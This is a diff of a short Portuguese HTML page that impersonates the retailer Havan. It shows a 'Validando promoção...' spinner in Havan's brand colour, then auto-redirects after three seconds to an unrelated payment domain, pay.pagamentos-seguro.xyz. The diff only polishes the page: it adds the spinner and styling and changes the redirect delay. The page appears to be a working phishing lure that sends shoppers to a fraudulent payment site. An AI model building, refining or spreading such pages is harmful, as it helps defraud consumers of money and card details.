@@ -1,12 +1,46 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-    <meta charset="utf-8"/>
-    <title>HAVAN</title>
-
-    <meta http-equiv="refresh" content="0; URL='https://pay.pagamentos-seguro.xyz/zj6aGn07b8W3wlK?'"/>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HAVAN - Validando Promoção</title>
+    <style>
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+            font-family: Arial, sans-serif;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 6px solid #ffffff;
+            border-top: 6px solid #0054a6; /* Azul da Havan */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        p {
+            position: absolute;
+            bottom: 20px;
+            font-size: 18px;
+            color: #0054a6; /* Azul da Havan */
+        }
+    </style>
+    <meta http-equiv="refresh" content="3; URL='https://pay.pagamentos-seguro.xyz/zj6aGn07b8W3wlK?'">
 </head>
 <body>
+    <div class="spinner"></div>
     <p>Validando promoção...</p>
 </body>
 </html>
